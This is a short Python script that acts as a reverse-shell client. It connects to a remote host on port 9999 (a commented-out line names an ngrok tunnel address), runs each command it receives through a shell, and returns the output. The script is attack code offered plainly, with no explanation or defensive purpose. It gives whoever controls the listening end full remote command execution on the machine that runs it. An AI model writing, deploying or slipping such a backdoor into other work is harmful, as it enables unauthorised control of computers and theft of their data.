#! /usr/bin/python3

import os
import socket
import subprocess

s = socket.socket()
#host = 'ttps://1fc5-2405-201-a41e-60aa-800a-d2fd-3afd-2998.ngrok-free.app'
# host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host='0.0.0.0'
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
   
    if data == 'he':
        os.system("chromium&")

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stderr= subprocess.PIPE, stdin=subprocess.PIPE)

        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str))

s.close()
